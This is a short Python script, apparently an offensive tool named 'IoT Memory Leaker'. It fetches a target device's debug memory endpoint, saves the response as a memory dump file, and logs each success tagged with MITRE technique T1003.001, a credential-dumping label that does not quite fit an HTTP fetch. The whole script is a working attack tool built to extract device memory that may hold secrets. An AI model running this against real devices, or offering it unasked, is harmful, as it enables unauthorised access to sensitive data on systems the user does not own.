#!/usr/bin/env python3

import requests
import argparse
import json
import os
from datetime import datetime

LOG_FILE = "results/iot_memory_leaker_log.json"
MITRE_TTP = "T1003.001"

def log_result(entry):
    os.makedirs("results", exist_ok=True)
    try:
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    except:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def leak_memory(url):
    try:
        r = requests.get(url, timeout=10)
        if r.ok and "mem" in r.text.lower():
            with open("results/leaked_memory_dump.bin", "wb") as f:
                f.write(r.content)
            log_result({
                "timestamp": datetime.utcnow().isoformat(),
                "url": url,
                "bytes": len(r.content),
                "ttp": MITRE_TTP
            })
            return True
        return False
    except Exception as e:
        return False

def main():
    parser = argparse.ArgumentParser(description="IoT Memory Leaker")
    parser.add_argument("--url", required=True, help="Target debug URL (e.g., http://host/debug/mem)")
    args = parser.parse_args()

    success = leak_memory(args.url)
    if success:
        print(f"[+] Memory leak successful. Dump saved.")
    else:
        print(f"[-] Failed to leak memory.")

if __name__ == "__main__":
    main()
